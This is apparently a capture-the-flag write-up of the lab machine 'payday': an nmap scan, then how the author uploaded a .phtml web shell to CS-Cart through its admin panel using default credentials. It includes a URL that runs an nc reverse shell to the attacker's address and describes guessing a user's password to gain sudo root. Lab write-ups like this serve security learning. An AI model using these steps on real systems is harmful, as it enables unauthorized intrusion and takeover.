```nmap -sC -sV -p- 192.168.169.39      
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-20 11:35 CDT
Nmap scan report for 192.168.169.39
Host is up (0.060s latency).
Not shown: 65527 closed tcp ports (conn-refused)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 4.6p1 Debian 5build1 (protocol 2.0)
| ssh-hostkey: 
|   1024 f36e8704ea2db360ff42ad26671794d5 (DSA)
|_  2048 bb03ceed13f19a9e3603e2afcab23504 (RSA)
80/tcp  open  http        Apache httpd 2.2.4 ((Ubuntu) PHP/5.2.3-1ubuntu6)
|_http-server-header: Apache/2.2.4 (Ubuntu) PHP/5.2.3-1ubuntu6
|_http-title: CS-Cart. Powerful PHP shopping cart software
110/tcp open  pop3        Dovecot pop3d
|_ssl-date: 2023-07-20T16:37:22+00:00; +57s from scanner time.
| ssl-cert: Subject: commonName=ubuntu01/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX
| Not valid before: 2008-04-25T02:02:48
|_Not valid after:  2008-05-25T02:02:48
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_RC4_128_WITH_MD5
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|_    SSL2_RC2_128_CBC_WITH_MD5
|_pop3-capabilities: CAPA TOP SASL PIPELINING UIDL STLS RESP-CODES
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: MSHOME)
143/tcp open  imap        Dovecot imapd
| ssl-cert: Subject: commonName=ubuntu01/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX
| Not valid before: 2008-04-25T02:02:48
|_Not valid after:  2008-05-25T02:02:48
|_ssl-date: 2023-07-20T16:37:22+00:00; +57s from scanner time.
|_imap-capabilities: CHILDREN NAMESPACE LOGIN-REFERRALS Capability SORT LITERAL+ SASL-IR LOGINDISABLEDA0001 STARTTLS completed MULTIAPPEND UNSELECT IMAP4rev1 THREAD=REFERENCES OK IDLE
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_RC4_128_WITH_MD5
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|_    SSL2_RC2_128_CBC_WITH_MD5
445/tcp open  netbios-ssn Samba smbd 3.0.26a (workgroup: MSHOME)
993/tcp open  ssl/imap    Dovecot imapd
| ssl-cert: Subject: commonName=ubuntu01/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX
| Not valid before: 2008-04-25T02:02:48
|_Not valid after:  2008-05-25T02:02:48
|_ssl-date: 2023-07-20T16:37:21+00:00; +57s from scanner time.
|_imap-capabilities: NAMESPACE LOGIN-REFERRALS CHILDREN SORT Capability SASL-IR LITERAL+ AUTH=PLAINA0001 completed MULTIAPPEND UNSELECT IMAP4rev1 THREAD=REFERENCES OK IDLE
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_RC4_128_WITH_MD5
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|_    SSL2_RC2_128_CBC_WITH_MD5
995/tcp open  ssl/pop3    Dovecot pop3d
| ssl-cert: Subject: commonName=ubuntu01/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX
| Not valid before: 2008-04-25T02:02:48
|_Not valid after:  2008-05-25T02:02:48
|_ssl-date: 2023-07-20T16:37:21+00:00; +57s from scanner time.
|_pop3-capabilities: USER CAPA SASL(PLAIN) PIPELINING UIDL TOP RESP-CODES
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_RC4_128_WITH_MD5
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|_    SSL2_RC2_128_CBC_WITH_MD5
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.26a)
|   Computer name: payday
|   NetBIOS computer name: 
|   Domain name: 
|   FQDN: payday
|_  System time: 2023-07-20T12:37:15-04:00
|_clock-skew: mean: 40m56s, deviation: 1h37m58s, median: 56s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 62.09 seconds
```

Taking a look at port 80, we are introduced to CS-CART. This service is old and looking it up, we are given this mentioned exploit.

```
https://www.exploit-db.com/exploits/48891
```

Basically, we need to login and get a shell uploaded as .phtml. So I renamed one of my command shells to simple-backdoor.phtml and logged in on /admin as admin:admin. And was able to upload the shell under template editor which uploads to /skins. You can then connect to the shell.

```
http://192.168.169.39/skins/simple-backdoor.phtml?cmd=nc%20192.168.45.216%20993%20-e%20%2Fbin%2Fsh
```

This gave me a reverse shell. Once on, I found that there is a user patrick. Testing his name as the password and we had a user with sudo privileges on all. I was then able to get root.